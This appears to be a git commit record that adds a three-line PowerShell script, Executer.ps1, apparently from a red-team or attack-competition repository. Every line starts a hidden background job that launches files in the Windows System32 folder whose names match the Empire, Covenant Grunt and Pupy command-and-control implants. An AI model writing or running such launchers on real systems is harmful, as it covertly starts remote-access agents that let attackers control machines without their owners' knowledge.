02395f8fafebde92daca7f010a2904f1fe689a0a
l1ghtman2k <aibek.zhil@gmail.com>
2019-09-28 07:53:08 -0400

    For Albany

---
+++ files/Executer.ps1
@@ -0,0 +1,3 @@
+start-job -scriptblock {Start-Process "C:\Windows\System32\empire.bat" -WindowStyle Hidden}
+start-job -scriptblock {Start-Process "C:\Windows\System32\GruntStager.ps1" -WindowStyle Hidden}
+start-job -scriptblock {Start-Process "C:\Windows\System32\pupy_windows.exe" -WindowStyle Hidden}
